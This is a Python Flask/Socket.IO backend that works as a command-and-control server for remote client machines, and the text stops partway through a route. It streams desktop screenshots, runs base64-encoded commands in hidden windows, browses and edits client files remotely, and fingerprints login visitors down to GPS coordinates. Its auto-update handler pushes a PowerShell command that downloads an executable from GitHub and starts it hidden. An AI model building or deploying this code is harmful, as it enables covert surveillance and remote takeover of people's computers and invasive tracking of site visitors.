"""
Run Backend Server - Flask & Socket.IO Central Controller
Provides real-time bi-directional WebSocket messaging, REST APIs for client management,
screenshot storage, remote command dispatch, remote file management (FTP), and activity logging.
"""

import os
import re
import uuid
import shutil
import sqlite3
import base64
import threading
import time
import subprocess
import json
import ipaddress
import urllib.request
from datetime import datetime, timezone
from contextlib import contextmanager
from functools import wraps
from typing import Any, Dict, List, Optional, Set, Tuple

from flask import Flask, render_template, request, jsonify, send_from_directory, Response
from flask_socketio import SocketIO, join_room
from dotenv import load_dotenv

# ── Environment & Application Configuration ──────────────────────────────────

load_dotenv()

app = Flask(__name__)

# Auto-detect async mode (gevent / eventlet / threading) or allow override via environment
ASYNC_MODE: Optional[str] = os.getenv("SOCKETIO_ASYNC_MODE", None)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode=ASYNC_MODE)

DASHBOARD_PASSWORD: Optional[str] = os.getenv("DASHBOARD_PASSWORD")
if not DASHBOARD_PASSWORD:
    raise RuntimeError("DASHBOARD_PASSWORD environment variable is required but not set.")

ACCESS_LOGS_PASSWORD: str = os.getenv("ACCESS_LOGS_PASSWORD", "").strip()


def check_access_logs_password(supplied: Optional[str]) -> bool:
    """Verify password against ACCESS_LOGS_PASSWORD from .env, falling back to DASHBOARD_PASSWORD if not configured."""
    required = ACCESS_LOGS_PASSWORD if ACCESS_LOGS_PASSWORD else DASHBOARD_PASSWORD
    return bool(supplied and supplied == required)

SCREENSHOT_DIR: str = "uploaded_frames"
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

AUTO_UPDATE_CLIENTS: bool = os.getenv("AUTO_UPDATE_CLIENTS", "true").strip().lower() in ("1", "true", "yes")
SERVER_VERSION: str = os.getenv("SERVER_VERSION", "").strip()
if not SERVER_VERSION:
    try:
        SERVER_VERSION = (
            subprocess.check_output(
                ["git", "rev-parse", "--short", "HEAD"],
                cwd=os.path.dirname(os.path.abspath(__file__)),
                stderr=subprocess.DEVNULL,
            )
            .decode("utf-8")
            .strip()
        )
    except Exception:
        SERVER_VERSION = ""

MAX_FRAMES_PER_USER: int = 1000
DATABASE_FILE: str = "database.db"

# Regular expression to protect against path traversal and SQL injection in identifiers
SAFE_NAME_RE: re.Pattern = re.compile(r"^[a-zA-Z0-9_\-\.]+$")

# ── Thread-Safe In-Memory State & Synchronization Locks ─────────────────────

# Lock for client tracking dictionaries
client_lock = threading.Lock()
active_clients: Dict[str, str] = {}  # Mapping: sid -> username
authenticated_sids: Set[str] = set()  # Set of authenticated WebSocket session IDs

# Lock for frame upload counters
counter_lock = threading.Lock()
upload_counters: Dict[str, int] = {}  # Mapping: username -> upload count

# Lock for pending single-screenshot request events
screenshot_lock = threading.Lock()
pending_screenshot_requests: Dict[str, Dict[str, Any]] = {}  # Mapping: req_id -> {event, username, result}

# Lock for pending file system (FTP) requests
fs_lock = threading.Lock()
pending_fs_requests: Dict[str, Dict[str, Any]] = {}  # Mapping: req_id -> {event, result}

# Lock for administrator blocked IP address set
blocked_ips_lock = threading.Lock()
blocked_ips_set: Set[str] = set()

# Lock and cooldown tracking for automatic legacy client updates
auto_update_lock = threading.Lock()
auto_update_cooldown: Dict[str, float] = {}  # Mapping: username -> timestamp of last dispatched update


def is_ip_blocked(ip: Optional[str]) -> bool:
    """Check if an IP address is in the administrator blacklist."""
    if not ip or not isinstance(ip, str):
        return False
    with blocked_ips_lock:
        return ip in blocked_ips_set


# ── Utility & Validation Helpers ─────────────────────────────────────────────

def is_safe_name(name: str) -> bool:
    """
    Validate that an identifier (username, filename, or token) is safe against path traversal.

    Parameters:
        name (str): The name or identifier string to validate.

    Returns:
        bool: True if the name contains only safe alphanumeric/hyphen/dot characters, False otherwise.
    """
    if not name or not isinstance(name, str):
        return False
    if ".." in name or "/" in name or "\\" in name:
        return False
    return bool(SAFE_NAME_RE.match(name))


# ── Database Layer & Context Manager ─────────────────────────────────────────

@contextmanager
def get_db():
    """
    Context manager providing thread-safe SQLite database connections.
    Enables WAL mode, enforces busy timeout, and performs automatic commit/rollback.

    Yields:
        sqlite3.Connection: An open SQLite connection with Row factory enabled.

    Raises:
        Exception: Re-raises any database exception encountered during the block.
    """
    conn = sqlite3.connect(DATABASE_FILE, timeout=20.0)
    conn.row_factory = sqlite3.Row
    try:
        conn.execute("PRAGMA journal_mode=WAL;")
        conn.execute("PRAGMA synchronous=NORMAL;")
        conn.execute("PRAGMA busy_timeout=20000;")
        yield conn
        conn.commit()
    except Exception:
        conn.rollback()
        raise
    finally:
        conn.close()


def init_db() -> None:
    """
    Initialize SQLite database schema, creating required tables and performance indexes.
    Sets up 'clients' table and 'operations_log' table with appropriate indexes.
    """
    with get_db() as conn:
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS clients (
                username TEXT PRIMARY KEY,
                visible INTEGER DEFAULT 1,
                capture INTEGER DEFAULT 0,
                version TEXT,
                updated_at TEXT
            )
            """
        )
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS operations_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL,
                op_type TEXT NOT NULL,
                details TEXT NOT NULL,
                status TEXT DEFAULT 'success',
                created_at TEXT DEFAULT (datetime('now'))
            )
            """
        )
        conn.execute(
            "CREATE INDEX IF NOT EXISTS idx_ops_user ON operations_log(username, id DESC);"
        )
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS access_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT NOT NULL,
                status TEXT NOT NULL,
                country TEXT,
                region TEXT,
                city TEXT,
                isp TEXT,
                browser TEXT,
                os TEXT,
                device TEXT,
                screen TEXT,
                timezone TEXT,
                language TEXT,
                hardware TEXT,
                gpu TEXT,
                latitude REAL,
                longitude REAL,
                accuracy REAL,
                gps_location TEXT,
                details TEXT,
                created_at TEXT DEFAULT (datetime('now'))
            )
            """
        )
        conn.execute(
            "CREATE INDEX IF NOT EXISTS idx_access_logs_id ON access_logs(id DESC);"
        )

        for col_name, col_type in (
            ("latitude", "REAL"),
            ("longitude", "REAL"),
            ("accuracy", "REAL"),
            ("gps_location", "TEXT"),
        ):
            try:
                conn.execute(f"ALTER TABLE access_logs ADD COLUMN {col_name} {col_type}")
            except sqlite3.OperationalError:
                pass

        try:
            conn.execute("ALTER TABLE clients ADD COLUMN ip TEXT")
        except sqlite3.OperationalError:
            pass

        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS blocked_ips (
                ip TEXT PRIMARY KEY,
                reason TEXT DEFAULT 'Blocked by administrator',
                created_at TEXT DEFAULT (datetime('now'))
            )
            """
        )


def load_blocked_ips() -> None:
    """Load existing blocked IP addresses from database into in-memory set."""
    try:
        with get_db() as conn:
            rows = conn.execute("SELECT ip FROM blocked_ips").fetchall()
            with blocked_ips_lock:
                blocked_ips_set.clear()
                for r in rows:
                    if r["ip"]:
                        blocked_ips_set.add(r["ip"])
    except Exception as e:
        print(f"[Blocked IPs Error] Failed to load blocked IPs: {e}")


# Initialize schema and blocked IP cache on startup
init_db()
load_blocked_ips()


def log_operation(username: str, op_type: str, details: str, status: str = "success") -> None:
    """
    Record an administrative or client operation in the database and broadcast to dashboard.

    Parameters:
        username (str): Target client username associated with the operation.
        op_type (str): Category of operation (e.g., SYSTEM, COMMAND, SPEAK, SCREENSHOT, FTP).
        details (str): Detailed description or payload summary of the event.
        status (str): Operational outcome status (e.g., 'success', 'dispatched', 'online', 'offline').
    """
    if not username or not is_safe_name(username):
        return
    try:
        with get_db() as conn:
            cursor = conn.cursor()
            cursor.execute(
                """
                INSERT INTO operations_log (username, op_type, details, status, created_at)
                VALUES (?, ?, ?, ?, datetime('now'))
                """,
                (username, op_type, details, status),
            )
            log_id = cursor.lastrowid
            row = cursor.execute(
                "SELECT created_at FROM operations_log WHERE id = ?", (log_id,)
            ).fetchone()
            created_at = (
                row["created_at"]
                if row
                else datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
            )

        socketio.emit(
            "new_operation_log",
            {
                "id": log_id,
                "username": username,
                "op_type": op_type,
                "details": details,
                "status": status,
                "created_at": created_at,
            },
            room="dashboard",
        )
    except Exception as e:
        print(f"[Log Error] Failed to write operations log: {e}")


# ── In-Memory IP Geolocation Cache & Telemetry Helpers ─────────────────────────

geo_cache: Dict[str, Dict[str, str]] = {}
geo_cache_lock = threading.Lock()


def get_client_ip() -> str:
    """Extract real client IP address considering proxy headers."""
    for header in ("CF-Connecting-IP", "X-Forwarded-For", "X-Real-IP"):
        val = request.headers.get(header)
        if val:
            ip = val.split(",")[0].strip()
            if ip:
                return ip
    return request.remote_addr or "127.0.0.1"


def get_ip_geolocation(ip: str) -> Dict[str, str]:
    """
    Perform geolocation lookup on an IP address with caching and quick timeout.
    Returns dictionary with country, region, city, isp.
    """
    with geo_cache_lock:
        if ip in geo_cache:
            return geo_cache[ip]

    # Check for private/loopback/invalid IP
    try:
        ip_obj = ipaddress.ip_address(ip)
        if ip_obj.is_private or ip_obj.is_loopback:
            res = {
                "country": "Local Network",
                "region": "Private",
                "city": "Internal",
                "isp": "Localhost / LAN",
            }
            with geo_cache_lock:
                geo_cache[ip] = res
            return res
    except Exception:
        pass

    res = {
        "country": "Unknown",
        "region": "",
        "city": "Unknown",
        "isp": "Unknown",
        "org": "",
        "as": "",
        "mobile": False,
        "proxy": False,
        "hosting": False,
    }
    try:
        req = urllib.request.Request(
            f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,as,mobile,proxy,hosting",
            headers={"User-Agent": "run-verifier/1.0"},
        )
        with urllib.request.urlopen(req, timeout=2.5) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            if data.get("status") == "success":
                res = {
                    "country": data.get("country") or "Unknown",
                    "region": data.get("regionName") or "",
                    "city": data.get("city") or "Unknown",
                    "isp": data.get("isp") or "Unknown",
                    "org": data.get("org") or "",
                    "as": data.get("as") or "",
                    "mobile": bool(data.get("mobile")),
                    "proxy": bool(data.get("proxy")),
                    "hosting": bool(data.get("hosting")),
                }
    except Exception as e:
        print(f"[Geo Lookup Error] {ip}: {e}")

    with geo_cache_lock:
        geo_cache[ip] = res
    return res


def parse_user_agent_summary(ua_string: str) -> Tuple[str, str, str]:
    """Parse user agent into (browser, os, device)."""
    ua = (ua_string or "").lower()

    # Operating System
    if "windows" in ua:
        os_name = "Windows"
    elif "macintosh" in ua or "mac os" in ua:
        os_name = "macOS"
    elif "android" in ua:
        os_name = "Android"
    elif "iphone" in ua:
        os_name = "iOS (iPhone)"
    elif "ipad" in ua:
        os_name = "iOS (iPad)"
    elif "linux" in ua:
        os_name = "Linux"
    elif "cros" in ua:
        os_name = "Chrome OS"
    else:
        os_name = "Unknown OS"

    # Device type
    if "mobile" in ua or "iphone" in ua or "android" in ua:
        device_type = "Mobile"
    elif "tablet" in ua or "ipad" in ua:
        device_type = "Tablet"
    else:
        device_type = "Desktop"

    # Browser
    if "edg/" in ua or "edge/" in ua:
        browser_name = "Edge"
    elif "chrome/" in ua and "chromium" not in ua:
        browser_name = "Chrome"
    elif "firefox/" in ua:
        browser_name = "Firefox"
    elif "safari/" in ua and "chrome" not in ua:
        browser_name = "Safari"
    elif "opera/" in ua or "opr/" in ua:
        browser_name = "Opera"
    else:
        browser_name = "Browser"

    return browser_name, os_name, device_type


def record_access_log(
    ip: str,
    status: str,
    fingerprint: Optional[Dict[str, Any]] = None,
    raw_ua: Optional[str] = None,
) -> None:
    """Record a dashboard login or verification attempt into access_logs table."""
    try:
        geo = get_ip_geolocation(ip)
        fp = fingerprint or {}
        ua_str = fp.get("userAgent") or raw_ua or request.headers.get("User-Agent", "")
        browser, os_name, device = parse_user_agent_summary(ua_str)

        screen = fp.get("screen", "")
        timezone_val = fp.get("timezone", "")
        language = fp.get("language", "")
        gpu = fp.get("gpu", "")

        gps = fp.get("gps") or {}
        lat = gps.get("latitude")
        lon = gps.get("longitude")
        acc = gps.get("accuracy")
        gps_location = ""
        if lat is not None and lon is not None:
            acc_str = f" (±{int(acc)}m)" if acc is not None else ""
            gps_location = f"{lat:.5f}, {lon:.5f}{acc_str}"
        elif fp.get("gpsLocationNote"):
            gps_location = str(fp.get("gpsLocationNote"))

        media = fp.get("media") or {}
        battery = fp.get("battery") or {}
        connection = fp.get("connection") or {}

        client_hints = fp.get("clientHints") or {}
        if os_name == "Windows" and client_hints.get("platformVersion"):
            try:
                major = int(client_hints["platformVersion"].split(".")[0])
                if major >= 13:
                    os_name = "Windows 11"
                else:
                    os_name = "Windows 10"
            except Exception:
                pass

        hardware_parts = []
        if fp.get("hardwareConcurrency"):
            hardware_parts.append(f"{fp['hardwareConcurrency']} cores")
        if fp.get("deviceMemory"):
            hardware_parts.append(f"{fp['deviceMemory']} GB RAM")
        arch = client_hints.get("architecture")
        bitness = client_hints.get("bitness")
        if arch or bitness:
            hardware_parts.append(f"{arch or ''} {bitness or ''}-bit".strip())
        hardware = ", ".join(hardware_parts)

        maps_url = f"https://www.google.com/maps?q={lat},{lon}" if (lat is not None and lon is not None) else None

        details_json = json.dumps(
            {
                "userAgent": ua_str,
                "platform": fp.get("platform", ""),
                "viewport": fp.get("viewport", ""),
                "tzOffset": fp.get("tzOffset"),
                "touchSupport": fp.get("touchSupport", False),
                "gpu": gpu,
                "gpuVendor": fp.get("gpuVendor", ""),
                "isp": geo.get("isp", ""),
                "org": geo.get("org", ""),
                "as": geo.get("as", ""),
                "mobile": geo.get("mobile", False),
                "proxy": geo.get("proxy", False),
                "hosting": geo.get("hosting", False),
                "gps": gps if (lat is not None and lon is not None) else None,
                "media": media,
                "battery": battery,
                "connection": connection,
                "webrtcIps": fp.get("webrtcIps") or [],
                "clientHints": client_hints,
                "audio": fp.get("audio"),
                "canvasHash": fp.get("canvasHash"),
                "mapsUrl": maps_url,
                "colorGamut": fp.get("colorGamut", ""),
                "isHdr": fp.get("isHdr", False),
                "orientation": fp.get("orientation", ""),
                "audioSampleRate": fp.get("audioSampleRate"),
            }
        )

        with get_db() as conn:
            cursor = conn.cursor()
            cursor.execute(
                """
                INSERT INTO access_logs (
                    ip, status, country, region, city, isp,
                    browser, os, device, screen, timezone,
                    language, hardware, gpu, latitude, longitude,
                    accuracy, gps_location, details, created_at
                )
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, datetime('now'))
                """,
                (
                    ip,
                    status.upper(),
                    geo.get("country", "Unknown"),
                    geo.get("region", ""),
                    geo.get("city", "Unknown"),
                    geo.get("isp", "Unknown"),
                    browser,
                    os_name,
                    device,
                    screen,
                    timezone_val,
                    language,
                    hardware,
                    gpu,
                    lat,
                    lon,
                    acc,
                    gps_location,
                    details_json,
                ),
            )
            log_id = cursor.lastrowid

        socketio.emit(
            "new_access_log",
            {
                "id": log_id,
                "ip": ip,
                "status": status.upper(),
                "is_blocked": is_ip_blocked(ip),
                "country": geo.get("country", "Unknown"),
                "region": geo.get("region", ""),
                "city": geo.get("city", "Unknown"),
                "isp": geo.get("isp", "Unknown"),
                "browser": browser,
                "os": os_name,
                "device": device,
                "screen": screen,
                "timezone": timezone_val,
                "language": language,
                "hardware": hardware,
                "gpu": gpu,
                "latitude": lat,
                "longitude": lon,
                "accuracy": acc,
                "gps_location": gps_location,
                "details": details_json,
                "created_at": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S"),
            },
            room="dashboard",
        )
    except Exception as e:
        print(f"[Access Log Error] Failed to record access log: {e}")


# ── Security & Authentication Middleware ─────────────────────────────────────

def require_password(f):
    """
    Flask route decorator requiring a valid 'x-password' header matching DASHBOARD_PASSWORD.

    Parameters:
        f (Callable): Route handler function to wrap.

    Returns:
        Callable: Wrapped route function returning 401 Unauthorized if check fails.
    """
    @wraps(f)
    def wrapper(*args, **kwargs):
        client_ip = get_client_ip()
        if is_ip_blocked(client_ip):
            return jsonify({"detail": "Access from this IP address is blocked by an administrator.", "status": "blocked"}), 403

        password = request.headers.get("x-password")
        if not password or password != DASHBOARD_PASSWORD:
            record_access_log(
                client_ip,
                "FAILED",
                raw_ua=request.headers.get("User-Agent", ""),
            )
            return jsonify({"detail": "Unauthorized", "status": "error"}), 401
        return f(*args, **kwargs)

    return wrapper


# ── Storage & Maintenance Subsystem ──────────────────────────────────────────

def prune_old_frames(folder_path: str, max_keep: int = MAX_FRAMES_PER_USER) -> None:
    """
    Prune oldest screenshot files in a client folder to enforce quota and bounded disk usage.

    Parameters:
        folder_path (str): Absolute or relative filesystem path to user's screenshot folder.
        max_keep (int): Maximum number of most recent frames to retain. Defaults to MAX_FRAMES_PER_USER.
    """
    try:
        if not os.path.exists(folder_path):
            return
        files = [
            f for f in os.listdir(folder_path)
            if f.lower().endswith((".png", ".jpg", ".jpeg"))
        ]
        if len(files) > max_keep:
            # Sort chronologically based on numeric timestamp prefix in filename
            files.sort(key=lambda f: int("".join(filter(str.isdigit, f)) or "0"))
            to_remove = files[: len(files) - max_keep]
            for f in to_remove:
                try:
                    os.remove(os.path.join(folder_path, f))
                except OSError:
                    pass
    except Exception as e:
        print(f"[Prune Error] Error during frame pruning for {folder_path}: {e}")


def _upsert_client_visibility(username: str, visible: int) -> None:
    """
    Helper function to insert or update the visibility state flag for a given client.

    Parameters:
        username (str): The target client username.
        visible (int): 1 for visible console window, 0 for hidden.
    """
    with get_db() as conn:
        conn.execute(
            """
            INSERT INTO clients (username, visible)
            VALUES (?, ?)
            ON CONFLICT(username) DO UPDATE SET
                visible = excluded.visible
            """,
            (username, visible),
        )


# ── WebSocket Real-Time Event Handlers ───────────────────────────────────────

@socketio.on("register_dashboard")
def handle_register_dashboard(data: Any) -> None:
    """
    Register an administrative browser dashboard session into the 'dashboard' broadcast room.

    Parameters:
        data (dict): Payload containing dashboard 'password' for authentication.
    """
    if not isinstance(data, dict):
        return
    password = data.get("password")
    if not password or password != DASHBOARD_PASSWORD:
        return
    join_room("dashboard")


@socketio.on("register")
def handle_register(data: Any) -> None:
    """
    Register an authenticated client daemon session, join user room, and update database.

    Parameters:
        data (dict): Payload containing 'username', 'auth_token', and 'version'.
    """
    if not isinstance(data, dict):
        return
    username = data.get("username")
    auth_token = data.get("auth_token")
    version = data.get("version", "")

    if not auth_token or auth_token != DASHBOARD_PASSWORD:
        print(
            f"[WebSocket Auth] Rejecting unauthenticated socket connection for username='{username}' sid='{request.sid}'"
        )
        socketio.disconnect(request.sid)
        return

    if not username or not is_safe_name(username):
        return

    with client_lock:
        authenticated_sids.add(request.sid)
        active_clients[request.sid] = username

    join_room(username)

    capture_val = False
    client_ip = get_client_ip()
    with get_db() as conn:
        cursor = conn.cursor()
        row = cursor.execute(
            "SELECT capture FROM clients WHERE username = ?", (username,)
        ).fetchone()
        if row:
            cursor.execute(
                "UPDATE clients SET updated_at = datetime('now'), version = ?, ip = ? WHERE username = ?",
                (version, client_ip, username),
            )
            capture_val = bool(row["capture"])
        else:
            cursor.execute(
                "INSERT INTO clients (username, version, updated_at, ip) VALUES (?, ?, datetime('now'), ?)",
                (username, version, client_ip),
            )
            capture_val = False

    socketio.emit("set_capture", {"capture": capture_val}, room=username)
    socketio.emit(
        "status_change",
        {"username": username, "online": True, "version": version, "ip": client_ip},
        room="dashboard",
    )
    log_operation(username, "SYSTEM", f"Client online ({client_ip}, v{version or 'dev'})", "online")

    # Automatically dispatch update command to outdated or legacy clients
    if AUTO_UPDATE_CLIENTS:
        is_legacy = (not version) or (version == "dev") or (
            bool(SERVER_VERSION) and not (version.startswith(SERVER_VERSION) or SERVER_VERSION.startswith(version))
        )
        if is_legacy:
            now = time.time()
            with auto_update_lock:
                last_dispatched = auto_update_cooldown.get(username, 0.0)
                should_dispatch = (now - last_dispatched) > 1800.0  # 30-minute cooldown
                if should_dispatch:
                    auto_update_cooldown[username] = now

            if should_dispatch:
                def _trigger_auto_update(target_user: str, client_ver: str) -> None:
                    time.sleep(3)  # Allow socket rooms and registration to fully stabilize
                    update_script = (
                        "$ProgressPreference = 'SilentlyContinue'; "
                        "$p = \"$env:APPDATA\\run\"; "
                        "if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p -Force | Out-Null }; "
                        "$sha = (Invoke-RestMethod 'https://api.github.com/repos/yuan-miranda/run/commits/main').sha; "
                        "$o = \"$p\\installer.exe\"; "
                        "Invoke-WebRequest -Uri \"https://github.com/yuan-miranda/run/raw/$sha/installer.exe\" -OutFile $o; "
                        "Start-Process -FilePath $o -WindowStyle Hidden"
                    )
                    encoded_cmd = base64.b64encode(update_script.encode("utf-8")).decode("utf-8")
                    socketio.emit("exec_command", {"cmd": encoded_cmd, "visible": 0}, room=target_user)
                    log_operation(
                        target_user,
                        "UPDATE",
                        f"Auto-dispatched client update (current: v{client_ver or 'legacy'}, target: v{SERVER_VERSION or 'latest'})",
                        "dispatched",
                    )
                    print(f"[*] Auto-dispatched update to legacy client '{target_user}' (v{client_ver or 'legacy'})")

                threading.Thread(target=_trigger_auto_update, args=(username, version), daemon=True).start()


@socketio.on("disconnect")
def handle_disconnect() -> None:
    """
    Handle WebSocket client or dashboard disconnection, cleaning up session mappings
    and notifying dashboard if a client has gone fully offline.
    """
    with client_lock:
        authenticated_sids.discard(request.sid)
        username = active_clients.pop(request.sid, None)
        is_still_online = username in active_clients.values() if username else False

    if username and not is_still_online:
        socketio.emit(
            "status_change", {"username": username, "online": False}, room="dashboard"
        )
        log_operation(username, "SYSTEM", "Client disconnected", "offline")


@socketio.on("heartbeat")
def handle_heartbeat(data: Any) -> None:
    """
    Process periodic heartbeat ping from an authenticated client daemon and touch updated_at.

    Parameters:
        data (dict): Payload containing client 'username' and 'version'.
    """
    with client_lock:
        if request.sid not in authenticated_sids or not isinstance(data, dict):
            return
        username = data.get("username")
        if not username or active_clients.get(request.sid) != username:
            return

    client_ip = get_client_ip()
    with get_db() as conn:
        conn.execute(
            "UPDATE clients SET updated_at = datetime('now'), ip = ? WHERE username = ?",
            (client_ip, username),
        )


@socketio.on("upload_frame")
def handle_upload_frame(data: Any) -> None:
    """
    Receive uploaded desktop screenshot frame (JPEG/PNG bytes or base64) from client,
    save to disk, broadcast event to dashboard, and notify any waiting single-shot promises.

    Parameters:
        data (dict): Payload containing 'username', 'filename', and 'image' bytes/string.
    """
    with client_lock:
        if request.sid not in authenticated_sids or not isinstance(data, dict):
            return
        username = data.get("username")
        if not username or active_clients.get(request.sid) != username:
            return

    filename = data.get("filename")
    raw_img = data.get("image")

    if not filename or not raw_img or not is_safe_name(username) or not is_safe_name(filename):
        return

    client_folder = os.path.join(SCREENSHOT_DIR, username)
    os.makedirs(client_folder, exist_ok=True)
    file_path = os.path.join(client_folder, filename)

    try:
        if isinstance(raw_img, bytes):
            image_bytes = raw_img
        elif isinstance(raw_img, str):
            raw_b64 = raw_img
            if "," in raw_b64:
                raw_b64 = raw_b64.split(",", 1)[1]
            image_bytes = base64.b64decode(raw_b64)
        else:
            return

        with open(file_path, "wb") as f:
            f.write(image_bytes)

        socketio.emit(
            "new_frame", {"username": username, "filename": filename}, room="dashboard"
        )

        # Notify any pending single-screenshot requests waiting for this user
        with screenshot_lock:
            for req_id, entry in list(pending_screenshot_requests.items()):
                if entry.get("username") == username and not entry["event"].is_set():
                    entry["result"] = {"success": True, "filename": filename}
                    entry["event"].set()

        # Periodically prune old frames asynchronously (every 50 frames)
        with counter_lock:
            count = upload_counters.get(username, 0) + 1
            upload_counters[username] = count

        if count % 50 == 0:
            threading.Thread(
                target=prune_old_frames,
                args=(client_folder, MAX_FRAMES_PER_USER),
                daemon=True,
            ).start()
    except Exception as e:
        print(f"[Upload Frame Error] Failed to persist frame: {e}")


@socketio.on("capture_screenshot_res")
def handle_screenshot_res(data: Any) -> None:
    """
    Handle single screenshot capture result emitted back from client daemon.

    Parameters:
        data (dict): Payload containing 'req_id', 'filename', and optional 'error'.
    """
    if not isinstance(data, dict):
        return
    req_id = data.get("req_id")
    with screenshot_lock:
        entry = pending_screenshot_requests.get(req_id)
        if entry:
            entry["result"] = data
            entry["event"].set()


@socketio.on("fs_list_res")
@socketio.on("fs_read_res")
@socketio.on("fs_write_res")
@socketio.on("fs_delete_res")
@socketio.on("fs_mkdir_res")
@socketio.on("fs_rename_res")
def handle_fs_response(data: Any) -> None:
    """
    Generic response dispatcher for remote file system / FTP actions.
    Matches incoming response by 'req_id' and releases waiting HTTP thread.

    Parameters:
        data (dict): Payload containing 'req_id' and 'payload' data.
    """
    if not isinstance(data, dict):
        return
    req_id = data.get("req_id")
    with fs_lock:
        entry = pending_fs_requests.get(req_id)
        if entry:
            entry["result"] = data.get("payload")
            entry["event"].set()


# ── REST API Routes: Dashboard & Client Listing ──────────────────────────────

@app.route("/")
def index() -> str:
    """Render the primary HTML dashboard interface."""
    return render_template("index.html")


@app.post("/api/auth/login")
def api_auth_login() -> Response:
    """
    Authenticate dashboard login, capture client IP and device telemetry verification,
    and persist record in access_logs audit table.
    """
    data = request.get_json(silent=True) or {}
    password = data.get("password", "")
    fingerprint = data.get("fingerprint") or {}
    client_ip = get_client_ip()

    if is_ip_blocked(client_ip):
        record_access_log(client_ip, "BLOCKED (IP Blacklisted)", fingerprint)
        return jsonify({"detail": "Access from this IP address is blocked by an administrator.", "status": "blocked"}), 403

    blocked_reason = fingerprint.get("blockedReason")
    if blocked_reason:
        record_access_log(client_ip, f"BLOCKED ({blocked_reason})", fingerprint)
        return jsonify({"detail": f"Access blocked: {blocked_reason}", "status": "blocked"}), 403

    if not password or password != DASHBOARD_PASSWORD:
        record_access_log(client_ip, "FAILED", fingerprint)
        return jsonify({"detail": "Invalid password", "status": "error"}), 401

    record_access_log(client_ip, "SUCCESS", fingerprint)
    return jsonify({"status": "success", "message": "Authenticated"})


@app.post("/api/access_logs/verify")
def verify_access_logs_auth() -> Response:
    """Verify separate password for viewing access verification audit logs."""
    data = request.get_json(silent=True) or {}
    password = data.get("password", "")
    if not check_access_logs_password(password):
        return jsonify({"status": "error", "message": "Invalid Access Logs password"}), 401
    return jsonify({"status": "success", "message": "Authorized"})


@app.get("/api/access_logs")
def get_access_logs() -> Response:
    """
    Fetch recent access verification audit logs (up to 200 items),
    strictly requiring authentication with ACCESS_LOGS_PASSWORD (or DASHBOARD_PASSWORD).
    """
    pwd = (
        request.headers.get("X-Access-Logs-Password")
        or request.headers.get("X-Password")
        or request.args.get("password")
    )
    if not check_access_logs_password(pwd):
        return jsonify({"status": "error", "message": "Unauthorized: Access Logs password required"}), 401

    with get_db() as conn:
        rows = conn.execute(
            """
            SELECT id, ip, status, country, region, city, isp,
                   browser, os, device, screen, timezone,
                   language, hardware, gpu, latitude, longitude,
                   accuracy, gps_location, details, created_at
            FROM access_logs
            ORDER BY id DESC
            LIMIT 200
            """
        ).fetchall()

    with blocked_ips_lock:
        current_blocked = set(blocked_ips_set)

    result = []
    for row in rows:
        item = dict(row)
        item["is_blocked"] = item.get("ip") in current_blocked
        result.append(item)

    return jsonify(result)


@app.post("/api/access_logs/block_ip")
def api_block_ip() -> Response:
    """Block an IP address from authenticating or accessing the dashboard."""
    pwd = (
        request.headers.get("X-Access-Logs-Password")
        or request.headers.get("X-Password")
        or request.args.get("password")
    )
    if not check_access_logs_password(pwd):
        return jsonify({"status": "error", "message": "Unauthorized: Access Logs password required"}), 401

    data = request.get_json(silent=True) or {}
    ip = (data.get("ip") or "").strip()
    reason = (data.get("reason") or "Blocked by administrator").strip()

    if not ip:
        return jsonify({"status": "error", "message": "Missing IP address"}), 400

    with get_db() as conn:
        conn.execute(
            "INSERT OR REPLACE INTO blocked_ips (ip, reason, created_at) VALUES (?, ?, datetime('now'))",
            (ip, reason),
        )

    with blocked_ips_lock:
        blocked_ips_set.add(ip)

    log_operation("SYSTEM", "SECURITY", f"IP address blocked: {ip} ({reason})", "success")
    socketio.emit("ip_blocked", {"ip": ip, "blocked": True}, room="dashboard")

    return jsonify({"status": "success", "message": f"IP {ip} blocked successfully", "ip": ip, "blocked": True})


@app.post("/api/access_logs/unblock_ip")
def api_unblock_ip() -> Response:
    """Unblock a previously blocked IP address."""
    pwd = (
        request.headers.get("X-Access-Logs-Password")
        or request.headers.get("X-Password")
        or request.args.get("password")
    )
    if not check_access_logs_password(pwd):
        return jsonify({"status": "error", "message": "Unauthorized: Access Logs password required"}), 401

    data = request.get_json(silent=True) or {}
    ip = (data.get("ip") or "").strip()

    if not ip:
        return jsonify({"status": "error", "message": "Missing IP address"}), 400

    with get_db() as conn:
        conn.execute("DELETE FROM blocked_ips WHERE ip = ?", (ip,))

    with blocked_ips_lock:
        blocked_ips_set.discard(ip)

    log_operation("SYSTEM", "SECURITY", f"IP address unblocked: {ip}", "success")
    socketio.emit("ip_blocked", {"ip": ip, "blocked": False}, room="dashboard")

    return jsonify({"status": "success", "message": f"IP {ip} unblocked successfully", "ip": ip, "blocked": False})


@app.get("/api/access_logs/blocked_ips")
def get_blocked_ips() -> Response:
    """Fetch all currently blocked IP addresses."""
    pwd = (
        request.headers.get("X-Access-Logs-Password")
        or request.headers.get("X-Password")
        or request.args.get("password")
    )
    if not check_access_logs_password(pwd):
        return jsonify({"status": "error", "message": "Unauthorized: Access Logs password required"}), 401

    with get_db() as conn:
        rows = conn.execute("SELECT ip, reason, created_at FROM blocked_ips ORDER BY created_at DESC").fetchall()

    return jsonify([dict(r) for r in rows])


@app.get("/api/clients")
@require_password
def get_clients() -> Response:
    """
    Fetch all registered client machines from the database, augmented with real-time online status.

    Returns:
        Response: JSON array of client metadata dictionaries.
    """
    with get_db() as conn:
        rows = conn.execute(
            """
            SELECT username, updated_at, visible, capture, version, ip
            FROM clients
            ORDER BY updated_at DESC
            """
        ).fetchall()

    with client_lock:
        online_usernames = set(active_clients.values())

    return jsonify(
        [
            {
                "username": row["username"],
                "updated_at": row["updated_at"],
